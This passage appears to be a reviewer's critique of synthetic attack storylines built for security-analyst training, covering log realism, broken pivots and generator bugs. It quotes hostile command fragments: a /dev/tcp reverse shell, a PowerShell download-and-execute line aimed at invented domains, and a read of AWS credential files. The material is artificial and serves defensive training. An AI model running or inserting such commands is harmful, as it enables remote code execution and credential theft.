- **Rewrite guidance:** Retarget to Entra ID / ADFS spraying (many users, one password, low and slow, `errorCode 50126`, then one success, then mailbox or SharePoint access), or to an internal spray from a compromised workstation (4625/4771 across many users from one internal host, then a 4624 success). Include a success and a follow-on action.

## rocketstack-chain-a — FIX
- **Recognised: 4.** IdP account compromise → S3 data theft → CloudTrail tampering (T1078, T1619, T1530, T1562.008), which matches common cloud-breach patterns.
- **Crypto:** no.
- **Detectable: 3.** GuardDuty `UnauthorizedAccess:IAMUser/TorIPCaller` would fire on rs_a2–a4 and is missing. Okta risk appears only in raw.
- **End-to-end: 2.** An Okta session (rs_a1) cannot produce IAM-user long-term keys (`AKIA…`, type IAMUser in rs_a2–a4). Okta → AWS federation produces `AssumeRoleWithSAML` / AssumedRole `ASIA` credentials. The pivot is broken. The earlier "Tel Aviv sign-in" is referenced but absent.
- **Log reliability: 2.**
  - rs_a1 native: geographicalContext Tel Aviv, asOrg hot-net (an Israeli ISP) and every behavior `NEGATIVE` for a Tor IP flagged as impossible travel. It contradicts raw (`TorIpAddress, ImpossibleTravel`) and its own `risk` field.
  - rs_a1 native: `credentialType null`, and requestUri `/authenticators/poll` implies an MFA push that is never explained.
  - rs_a4: `requestParameters` uses `trail_name` / `event_selectors` as a string. Real CloudTrail is `trailName` plus `eventSelectors:[{readWriteType, includeManagementEvents, dataResources}]`.
  - rs_a4: trail ARN account `123456789` ≠ 677005474693.
  - rs_a2 description "reconnaissance ahead of the object read four minutes later" leaks the conclusion.
- **Fixes:**
  1. Insert `AssumeRoleWithSAML` (Okta IdP) and switch rs_a2–a4 to AssumedRole / ASIA. Alternatively, add a row showing where the IAM keys came from (for example, Okta → a vault/secret page).
  2. Fix the rs_a1 native geo, ASN and behaviors to Tor (New IP / New Geo POSITIVE, isProxy true), and add the prior Tel Aviv session.
  3. Fix the rs_a4 schema and ARN.
  4. Add a GuardDuty TorIPCaller finding.
  5. Add `bytesTransferredOut` in rs_a3 additionalEventData.

## rocketstack-chain-b — FIX
- **Recognised: 5.** Malicious / dependency-confusion npm package with a postinstall script (T1195.001; Birsan 2021, ua-parser-js, the 2025 "Shai-Hulud" npm worm) → reverse shell → theft of cloud credentials from the developer laptop → IAM persistence.
- **Crypto:** no.
- **Detectable: 4.** The Falcon reverse-shell detection on rs_b3 is realistic. GuardDuty would flag rs_b4 (a new IP for the key).
- **End-to-end: 3.**
  - Path: rs_b1 → b2 (domain to 104.248.93.41) → b3 (same IP) → b4 (same IP using s.amir keys). Good IP pivot.
  - Missing: credential access (a read of `~/.aws/credentials`).
  - Missing: the `CreateUser svc-backup-01` and `CreateAccessKey` events, which the description cites but which are absent.
  - Missing: the package fetch (registry proxy log).
- **Log reliability: 3.**
  - rs_b3 native is NetworkConnectIP4 only. The `bash -i >& /dev/tcp/…` command line (the key evidence) is in raw only, not on the native card.
  - rs_b1 postinstall runs from `/tmp/.npm-install/` rather than `node_modules/rocketstack-utils/`.
  - rs_b2 has no vendor (undefined).
- **Fixes:**
  1. Add a ProcessRollup2 for bash with the /dev/tcp command line (parent node).
  2. Add a file-read or `cat ~/.aws/credentials` process row.
  3. Add CloudTrail `CreateUser`, then `CreateAccessKey`, before rs_b4.
  4. Add the npm registry/proxy fetch of rocketstack-utils@3.2.1.
  5. Set the rs_b2 vendor and fix the postinstall path.

## rocketstack-chain-c — REMOVE (crypto)
- **Recognised: 2.** The title is "Container Escape → Crypto Mining + Prod Secrets". xmrig to supportxmr (rs_c2, T1496) is a central element.
- **Crypto: yes.** The title and rs_c2.
- **Detectable: 3.** **End-to-end: 2.** **Logs: 2.**
  - rs_c1 is t.levy running `docker run --privileged … nsenter` on his own laptop. That is root on his own box, not an escape by an attacker. No adversary or initial access exists.
  - rs_c3 CloudTrail `sourceIPAddress 172.16.10.7` is private; CloudTrail sees the public NAT IP. The userIdentity ARN account `123456789012` ≠ accountId 677005474693.
  - rs_c3 description "The compromised container used t.levy's cached AWS SSO session credentials" states the conclusion.
- **Fixes:** Remove it. If the cloud half is wanted, write a new storyline: compromised developer host (with a real initial vector) → reuse of cached SSO credentials → `GetSecretValue` (public IP) → large prod-DB pull (rs_c4 is a good FortiGate record), without any miner.

## rocketstack-chain-d — FIX
- **Recognised: 4.** Credential stuffing against Okta (Okta 2023–2024 advisories, T1110.004) → valid login → cloud data access.
- **Crypto:** no.
- **Detectable: 4.** Okta ThreatInsight / risk HIGH and the lockout are present.
- **End-to-end: 2.**
  - An Okta success (rs_d3) does not yield IAM-user AKIA keys used via aws-cli two minutes later (rs_d4). This is the same broken federation link as chain-a; the title says "Console" but the record is CLI.
  - "Read from rocketstack-prod-customer-data" has no GetObject.
  - rs_d3 hits `/authenticators/poll` (an MFA push) with no MFA story.
- **Log reliability: 2.**
  - 89.248.171.44 (a Dutch hosting range) is labelled CN / Shenzhen / AS4134 in rs_d1 and d3, but Tel Aviv / hot-net in rs_d2 native.
  - rs_d1 native `actor unknown`; Okta logs the attempted username. "78 failures across 24 usernames" is prose only.
  - rs_d4 `ListBuckets` with `requestParameters.bucketName` (ListBuckets takes none).
- **Fixes:**
  1. Emit 3–4 representative `user.session.start FAILURE` rows with real usernames, or an Okta ThreatInsight `security.threat.detected` row.
  2. Make the geo consistent (pick NL hosting).
  3. Explain MFA on rs_d3: either no MFA (credentialType PASSWORD, factor none) or an MFA fatigue row.
  4. Replace rs_d4 with `AssumeRoleWithSAML` + `ConsoleLogin` (or AssumedRole CLI), then `GetObject` with bytesTransferredOut.

## medcore-chain-a — FIX
- **Recognised: 4.** Macro document → PowerShell downloader → ransomware via PsExec on a clinical server (healthcare ransomware, the classic Emotet/QakBot → Conti/Ryuk path). Internet-origin macros are now blocked by default (MOTW), so a short note on why it ran would help (for example, a trusted location or MOTW stripped by an archive).
- **Crypto:** no.
- **Detectable: 4.** The SentinelOne `OFFICE_MACRO_CMD_SPAWN` (mc_a2) and the ransomware detection (mc_a4) are realistic alerts.
- **End-to-end: 2.**
  - mc_a2 shows cmd → powershell but not WINWORD.EXE → cmd, so the doc → process link exists only in prose.
  - The decoded payload is `$c=New-Object Net.WebClient;$c.DownloadString('http://cdn-medupdate.net/m.ps1')`. That domain does not match mc_a3's DNS query `update-zorg-nl.eu`, and DownloadString without IEX executes nothing.
  - Between 08:16 and 08:49 there is no C2, no credential theft, no lateral movement and no PsExec source host or 7045/PSEXESVC service install, so how ransomware reached SRV-MEDCORE-EMR01 cannot be shown.
- **Log reliability: 3.**
  - The authored `file.sha256` of the .docm equals powershell.exe's `tgt.process.image.sha256` (f10052e1…), which is impossible.
  - mc_a4 raw `s1.files_encrypted 847` / `s1.network_isolated true` are not S1 fields. Native shows `agentNetworkStatus connected` (not isolated) and a kill-only mitigation, which contradicts raw. The "847 files encrypted" claim is not in native.
  - mc_a3 Infoblox native timestamps use local time (10:16) against 08:16Z elsewhere.
  - "Ransomware.MedLock" is an invented family.
  - mc_a1 raw `MessageDelivered` is not a UAL operation.
- **Fixes:**
  1. Add a WINWORD.EXE → cmd.exe row.
  2. Make the encoded command `IEX (… DownloadString('http://update-zorg-nl.eu/m.ps1'))` to match mc_a3, and add a proxy/firewall row to 178.62.88.14.
  3. Add a credential-access or C2 beacon row, then a 4624 type 3 plus 7045 (PSEXESVC) on SRV-MEDCORE-EMR01 from WS-MED-PETERS or a pivot host.
  4. Give the docm its own hash.
  5. Align the S1 native with isolation, or drop the isolation claim. Put the encrypted-file count in a real field or a separate file-rename row.
  6. Use UTC in the Infoblox native or note the timezone.

---

## Cross-cutting observations
1. **The native renderer breaks pivots and drops the evidence that matters.** Fields trainees see on native cards contradict raw or are empty:
   - User objectIds regenerate per record (aitm, infostealer, helpdesk).
   - Initiating-process hashes and paths regenerate (infostealer evt_05 / 06, edge evt_06, webshell CS PIDs / SIDs / LocalAddressIP4).
   - `modifiedProperties` is emptied on "User registered security info" (aitm_12, hmr_06).
   - `networkLocationDetails` is emptied (aitm_08); ServiceNow `work_notes` is emptied (hmr_04).
   - The MDE account fields are null (nexacorp-chain-c).
   - PAN TRAFFIC / Check Point cards replace FortiGate WAF rows and lose URL and user (edge-vpn, esxi evt_02).
   - Okta geo and ASN are re-homed to Tel Aviv / hot-net for Tor and foreign IPs (rocketstack-a, d).

   Fix the generator so that (a) identity, process and hash fields are carried from the authored event, and (b) the decisive field of each row is guaranteed to appear in the native record.
2. **Evidence lives in prose instead of in records, and descriptions do the analysis.** Byte counts on MDE/CS connection events, which cannot carry bytes (webshell evt_14, nexacorp-c3, infostealer evt_07). Aggregates such as "118 hosts scanned", "61 logins / 14 principals", "23 files", "78 failures / 24 users" backed by one sample row. Rows cited but absent (CreateUser, Local State, the extortion email, the .akira rename). Descriptions or SIEM rows that state the conclusion: edge evt_04, infostealer evt_08 / 09, helpdesk evt_03 / 06, exfil-first evt_07 / 08, rogue-admin evt_10, rocketstack-a2 / c3. Rule: every claim in a description must be visible in that row's native record or in another row; SIEM alerts list entities, not verdicts.
3. **Root cause and initial-access links are routinely missing or impossible, especially in the 4-event "chain" stories.**
   - Okta → AWS IAM-user AKIA keys (rocketstack-a, d) is not how federation works.
   - Phish → sign-in with no click (nexacorp-a).
   - VPN → jump host with no logon (edge-vpn).
   - MFA registration with no sign-in (helpdesk).
   - Workstation phish → server ransomware with no lateral movement (medcore-a).
   - Exfil with no actor (exfil-first).
   - Rogue admin with no credential source (rogue-admin).

   Two storylines are crypto-themed and must go (linux-cryptominer, rocketstack-chain-c). Also, 185.220.101.47 is reused as the attacker IP in 5 storylines (edge-vpn, helpdesk, infostealer, dcsync, k8s-pod-escape), and private IPs appear as cloud source IPs (nexacorp-c1, rocketstack-c3). Give each story unique, plausible attacker infrastructure.
